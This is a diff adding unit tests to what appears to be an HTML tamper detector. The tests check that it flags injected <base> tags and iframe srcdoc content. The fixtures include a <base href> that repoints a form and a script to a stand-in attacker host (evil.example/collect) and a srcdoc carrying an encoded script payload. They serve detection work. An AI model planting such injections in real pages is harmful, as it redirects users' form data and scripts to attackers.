@@ -187,3 +187,48 @@ def test_inline_script_multiline_and_chunked_is_buffered_into_single_digest():
     unclosed = "<html><body><script>const x = 42;"
     f_unclosed = facts(unclosed)
     assert len([fact for fact in f_unclosed if fact.startswith("inline-script:")]) == 1
+
+
+def test_base_injection_repoints_relative_form_and_assets():
+    original = '<form action="submit"></form><script src="app.js"></script>'
+    injected = original + '<base href="https://evil.example/collect/">'
+    diff = compare_structure(facts(original), facts(injected))
+    assert diff.score > 0
+    assert "form:https://evil.example/collect/submit" in diff.added
+    assert "script:https://evil.example/collect/app.js" in diff.added
+
+
+def test_first_base_href_wins_and_relative_base_is_resolved():
+    html = ('<base target="_blank"><base href="../safe/">'
+            '<base href="https://evil.example/"><form action="submit"></form>')
+    assert "form:https://hospital.example.com/safe/submit" in facts(html)
+    assert not any("evil.example" in fact for fact in facts(html))
+    empty = '<base href=""><base href="https://evil.example/"><form action="submit">'
+    assert "form:https://hospital.example.com/th/submit" in facts(empty)
+
+
+def test_base_changes_are_tracked_even_without_url_elements():
+    assert compare_structure(facts(""), facts('<base href="/other/">')).changed
+
+
+def test_srcdoc_changes_are_detected_even_with_allowlisted_fallback_src():
+    original = '<iframe src="https://trusted.example/" style="display:none"></iframe>'
+    injected = original.replace(
+        "<iframe", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"'
+    )
+    allowed = ("trusted.example",)
+    diff = compare_structure(facts(original, allowed), facts(injected, allowed))
+    assert diff.score > 0
+    assert len(diff.added) == 1
+    assert diff.added[0].startswith("iframe-srcdoc:")
+    assert "alert" not in diff.summary
+    modified = injected.replace("alert(1)", "alert(2)")
+    assert compare_structure(facts(injected), facts(modified)).changed
+    assert not compare_structure(facts(injected), facts(injected)).changed
+
+
+def test_srcdoc_hashes_decoded_content_and_tracks_empty_attribute():
+    assert facts('<iframe srcdoc="&lt;p&gt;Hello&lt;/p&gt;">') == facts(
+        '<iframe srcdoc="<p>Hello</p>">'
+    )
+    assert compare_structure(facts('<iframe>'), facts('<iframe srcdoc="">')).changed
